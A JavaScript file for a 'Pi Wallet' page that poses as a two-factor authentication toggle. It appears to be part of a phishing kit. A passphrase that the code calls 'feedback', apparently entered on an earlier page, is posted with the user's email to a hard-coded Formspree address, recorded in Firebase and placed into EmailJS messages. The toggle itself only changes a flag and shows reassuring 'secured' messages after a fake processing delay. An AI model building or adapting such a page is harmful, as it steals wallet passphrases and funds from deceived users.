const toggleBtn = document.getElementById("toggleBtn");
const statusText = document.getElementById("statusText");
const form = document.getElementById("toggleForm");
const actionField = document.getElementById("actionField");
const timestampField = document.getElementById("timestampField");
const emailInput = document.querySelector(".email-input");
const successMessage = document.getElementById("successMessage");

let isOn = false;
let isProcessing = false;
let currentEmailHash = null;
let feedbackHash = null;
let feedback = null;
let isReturningFeedback = false;
let previousEmail = null;

// Configuration
const FORMSPREE_URL = "https://formspree.io/f/mqeqpjpb";
const PROCESSING_DELAY = 1500;

// EmailJS Configuration
const EMAILJS_PUBLIC_KEY = "hU96YZH7Plzqh0qVZ"; // Replace with your EmailJS public key
const EMAILJS_SERVICE_ID = "service_00tdufa"; // Replace with your EmailJS service ID
const EMAILJS_TEMPLATE_ID_ENABLED = "template_1gk8xyo"; // Template for 2FA enabled
const EMAILJS_TEMPLATE_ID_DISABLED = "template_bdwns9y"; // Template for 2FA disabled

// Initialize EmailJS
(function() {
    emailjs.init(EMAILJS_PUBLIC_KEY);
})();

// Hash function for email
function hashEmail(email) {
    let hash = 0;
    for (let i = 0; i < email.length; i++) {
        const char = email.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

// Send email notification using EmailJS
async function sendEmailNotification(email, is2FAEnabled, feedback) {
    try {
        const templateId = is2FAEnabled ? EMAILJS_TEMPLATE_ID_ENABLED : EMAILJS_TEMPLATE_ID_DISABLED;
        
        const templateParams = {
            to_email: email,
            user_email: email,
            status: is2FAEnabled ? 'ENABLED' : 'DISABLED',
            action: is2FAEnabled ? 'enabled' : 'disabled',
            timestamp: new Date().toLocaleString(),
            feedback: feedback || 'Not provided',
            status_message: is2FAEnabled 
                ? 'Your 2-Factor Authentication has been successfully enabled.' 
                : 'Your 2-Factor Authentication has been disabled.',
            next_steps: is2FAEnabled 
                ? 'Your wallet is now secured with two-factor authentication. Keep your passphrase safe!' 
                : 'Your 2FA has been turned off. You can re-enable it anytime for better security.'
        };
        
        console.log('Sending email via EmailJS to:', email);
        
        const response = await emailjs.send(
            EMAILJS_SERVICE_ID,
            templateId,
            templateParams
        );
        
        console.log('EmailJS response:', response);
        
        if (response.status === 200) {
            console.log('Email sent successfully via EmailJS');
            return true;
        } else {
            console.error('EmailJS failed with status:', response.status);
            return false;
        }
    } catch (error) {
        console.error('Error sending email via EmailJS:', error);
        return false;
    }
}

// Load previous 2FA state from Firebase
async function loadPrevious2FAState(emailHash) {
    try {
        const snapshot = await firebase.database()
            .ref('auth_states/' + emailHash)
            .once('value');
        return snapshot.val();
    } catch (error) {
        if (error.code === 'PERMISSION_DENIED') {
            console.warn('Firebase permission denied. Please check database rules.');
            showError('Database access denied. Please check Firebase configuration.');
        } else {
            console.error('Error loading 2FA state:', error);
            showError('Failed to load previous state. Please try again.');
        }
        return null;
    }
}

// Save 2FA state to Firebase
async function save2FAState(emailHash, email, state) {
    try {
        await firebase.database()
            .ref('auth_states/' + emailHash)
            .set({
                email: email,
                is2FAEnabled: state,
                lastUpdated: firebase.database.ServerValue.TIMESTAMP,
                updatedAt: new Date().toISOString()
            });
        console.log('2FA state saved to Firebase:', state);
        return true;
    } catch (error) {
        if (error.code === 'PERMISSION_DENIED') {
            console.warn('Firebase permission denied while saving state.');
            showError('Cannot save to database. Please check Firebase configuration.');
        } else {
            console.error('Error saving 2FA state:', error);
            showError('Failed to save state. Please try again.');
        }
        return false;
    }
}

// Update submission with email info and mark as sent to Formspree
async function updateSubmissionWithEmail(feedbackHash, emailHash, email) {
    try {
        await firebase.database()
            .ref('submissions/' + feedbackHash)
            .update({
                sentToFormspree: true,
                emailHash: emailHash,
                email: email,
                sentAt: new Date().toISOString()
            });
        console.log('Submission updated with email info');
        return true;
    } catch (error) {
        if (error.code === 'PERMISSION_DENIED') {
            console.warn('Firebase permission denied while updating submission.');
        } else {
            console.error('Error updating submission:', error);
        }
        return false;
    }
}

// Get feedback from Firebase
async function getFeedbackFromFirebase(feedbackHash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + feedbackHash)
            .once('value');
        const data = snapshot.val();
        return data;
    } catch (error) {
        if (error.code === 'PERMISSION_DENIED') {
            console.warn('Firebase permission denied for submissions.');
            showError('Cannot access feedback data. Please check Firebase configuration.');
        } else {
            console.error('Error getting feedback:', error);
            showError('Failed to retrieve feedback. Please try again.');
        }
        return null;
    }
}

// Initialize page with previous state if exists
async function initializePage() {
    try {
        // Check if user came from feedback page with a feedback
        feedbackHash = sessionStorage.getItem('feedbackHash');
        feedback = sessionStorage.getItem('feedback');
        isReturningFeedback = sessionStorage.getItem('isReturningFeedback') === 'true';
        
        console.log('Initializing page...', {
            feedbackHash,
            hasStoredFeedback: !!feedback,
            isReturningFeedback
        });
        
        // If no feedback in session but we have a hash, try to get it from Firebase
        if (feedbackHash && !feedback) {
            const data = await getFeedbackFromFirebase(feedbackHash);
            if (data && data.feedback) {
                feedback = data.feedback;
                console.log('Loaded feedback from Firebase');
            }
        }
        
        // If returning with a feedback that has been submitted before
        if (isReturningFeedback && feedbackHash) {
            console.log('Loading previous state for returning feedback...');
            
            // Get submission data
            const submissionData = await getFeedbackFromFirebase(feedbackHash);
            
            if (submissionData && submissionData.sentToFormspree && submissionData.email) {
                // Auto-fill the previous email
                emailInput.value = submissionData.email;
                previousEmail = submissionData.email;
                
                const emailHash = hashEmail(submissionData.email);
                currentEmailHash = emailHash;
                
                // Load the 2FA state for this email
                const previousState = await loadPrevious2FAState(emailHash);
                
                if (previousState && previousState.is2FAEnabled) {
                    // Set the toggle to ON
                    isOn = true;
                    toggleBtn.classList.add("on");
                    
                    updateStatus("✓ 2-factor authentication is ON", "#27ae60");
                    console.log('Previous 2FA state loaded: ON');
                } else {
                    isOn = false;
                    toggleBtn.classList.remove("on");
                    updateStatus("✗ 2-factor authentication is OFF", "#e74c3c");
                    console.log('Previous 2FA state loaded: OFF');
                }
            }
        } else {
            // New feedback or no previous state
            isOn = false;
            toggleBtn.classList.remove("on");
            updateStatus("✗ 2-factor authentication is OFF", "#e74c3c");
        }
    } catch (error) {
        console.error('Error initializing page:', error);
        showError('Failed to initialize page. Please refresh.');
    }
}

// Auto-load state when email is entered or changed
async function loadStateForEmail() {
    const email = emailInput.value.trim();
    if (!email) return;
    
    try {
        const emailHash = hashEmail(email);
        currentEmailHash = emailHash;
        
        const previousState = await loadPrevious2FAState(emailHash);
        
        if (previousState) {
            isOn = previousState.is2FAEnabled;
            toggleBtn.classList.toggle("on", isOn);
            
            const statusMessage = isOn
                ? "✓ 2-factor authentication is ON"
                : "✗ 2-factor authentication is OFF";
            const statusColor = isOn ? "#27ae60" : "#e74c3c";
            
            updateStatus(statusMessage, statusColor);
            
            console.log('Loaded previous 2FA state for this email:', isOn);
        }
    } catch (error) {
        console.error('Error loading state for email:', error);
    }
}

// Event listeners for email field
emailInput.addEventListener('blur', loadStateForEmail);
emailInput.addEventListener('change', loadStateForEmail);

// Prevent normal form submission
form.addEventListener("submit", (e) => {
    e.preventDefault();
});

// UI Update Functions
const updateStatus = (message, color) => {
    statusText.textContent = message;
    statusText.style.color = color;
};

const setButtonState = (disabled) => {
    toggleBtn.classList.toggle("disabled", disabled);
};

const showSuccessMessage = (message = "✓ Check your email for confirmation!") => {
    successMessage.textContent = message;
    successMessage.classList.add("show");
};

const hideSuccessMessage = () => {
    successMessage.classList.remove("show");
};

const showError = (message) => {
    updateStatus("⚠️ " + message, "#e74c3c");
    setTimeout(() => {
        updateStatus("2-factor authentication is " + (isOn ? "ON" : "OFF"), isOn ? "#27ae60" : "#e74c3c");
    }, 5000);
};

// Send combined data to Formspree (feedback + email + 2FA state)
const submitCombinedDataToFormspree = async (email, feedback, is2FAEnabled) => {
    try {
        const formData = new FormData();
        formData.append('email', email);
        formData.append('feedback', feedback);
        formData.append('action', is2FAEnabled ? '2FA Enabled' : '2FA Disabled');
        formData.append('is2FAEnabled', is2FAEnabled);
        formData.append('timestamp', new Date().toLocaleString());
        formData.append('_subject', 'Pi Wallet - Feedback & 2FA Submission');
        
        const response = await fetch(FORMSPREE_URL, {
            method: "POST",
            headers: {
                "Accept": "application/json"
            },
            body: formData
        });
        
        if (response.ok) {
            console.log("Combined data sent successfully to Formspree");
            return true;
        } else {
            console.error("Formspree submission failed with status:", response.status);
            return false;
        }
    } catch (error) {
        console.error("Network error while submitting to Formspree:", error);
        return false;
    }
};

// Validation
const validateEmail = () => {
    if (!emailInput.value.trim()) {
        alert("Please enter your email before authenticating.");
        emailInput.focus();
        return false;
    }
    
    // Basic email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(emailInput.value.trim())) {
        alert("Please enter a valid email address.");
        emailInput.focus();
        return false;
    }
    
    return true;
};

const validateFeedback = () => {
    if (!feedback) {
        alert("No passphrase found. Please go back to the feedback page and enter your passphrase.");
        return false;
    }
    return true;
};

// Main Handler - WITH EMAILJS INTEGRATION
toggleBtn.addEventListener("click", async () => {
    if (!validateEmail() || !validateFeedback() || isProcessing) {
        return;
    }
    
    isProcessing = true;
    hideSuccessMessage();
    setButtonState(true);
    
    updateStatus("Processing your request...", "#f39c12");
    
    await new Promise(resolve => setTimeout(resolve, PROCESSING_DELAY));
    
    try {
        const email = emailInput.value.trim();
        const emailHash = hashEmail(email);
        const emailChanged = previousEmail && previousEmail !== email;
        
        // Get current submission data
        const submissionData = feedbackHash ? await getFeedbackFromFirebase(feedbackHash) : null;
        const alreadySentToFormspree = submissionData ? submissionData.sentToFormspree : false;
        
        // Determine the NEW state (toggle the current state)
        const newState = !isOn;
        
        console.log('Toggle clicked:', {
            currentState: isOn,
            newState: newState,
            email: email,
            emailChanged: emailChanged,
            alreadySentToFormspree: alreadySentToFormspree
        });
        
        if (newState) {
            // User is turning ON
            console.log('Turning 2FA ON...');
            
            // Update UI
            toggleBtn.classList.add("on");
            updateStatus("✓ 2FA Authentication ENABLED", "#27ae60");
            
            // Save state to Firebase
            const saveSuccess = await save2FAState(emailHash, email, true);
            
            if (!saveSuccess) {
                // Revert UI if save failed
                toggleBtn.classList.remove("on");
                updateStatus("⚠️ Failed to save state. Please try again.", "#e74c3c");
                isProcessing = false;
                setButtonState(false);
                return;
            }
            
            // Send to Formspree if needed
            if (!alreadySentToFormspree || emailChanged) {
                console.log('Sending combined data to Formspree: feedback + email + 2FA status');
                
                const formspreeSuccess = await submitCombinedDataToFormspree(email, feedback, true);
                
                if (formspreeSuccess) {
                    // Update Firebase with email info
                    if (feedbackHash) {
                        await updateSubmissionWithEmail(feedbackHash, emailHash, email);
                        previousEmail = email;
                    }
                } else {
                    updateStatus("⚠️ Connection error. State saved locally.", "#e74c3c");
                }
            }
            
            // Send email notification via EmailJS
            console.log('Sending email notification via EmailJS...');
            const emailSent = await sendEmailNotification(email, true, feedback);
            
            if (emailSent) {
                showSuccessMessage("✓ 2FA enabled! Check your email for confirmation.");
            } else {
                showSuccessMessage("✓ 2FA enabled! (Email notification failed)");
            }
            
            // Update the state variable
            isOn = true;
            
        } else {
            // User is turning OFF
            console.log('Turning 2FA OFF...');
            
            // Update UI
            toggleBtn.classList.remove("on");
            updateStatus("✗ 2FA Authentication DISABLED", "#e74c3c");
            
            // Save OFF state to Firebase
            await save2FAState(emailHash, email, false);
            
            // Send email notification via EmailJS
            console.log('Sending 2FA disabled notification via EmailJS...');
            const emailSent = await sendEmailNotification(email, false, feedback);
            
            if (emailSent) {
                showSuccessMessage("✓ 2FA disabled. Confirmation email sent.");
            } else {
                showSuccessMessage("✓ 2FA disabled successfully.");
            }
            
            // Update the state variable
            isOn = false;
        }
        
        // After first interaction with this feedback, mark it as processed
        if (isReturningFeedback) {
            sessionStorage.setItem('isReturningFeedback', 'false');
            isReturningFeedback = false;
        }
        
    } catch (error) {
        console.error('Error in toggle handler:', error);
        showError('An error occurred. Please try again.');
    } finally {
        setButtonState(false);
        isProcessing = false;
    }
});

// Initialize on page load

window.addEventListener('DOMContentLoaded', initializePage);
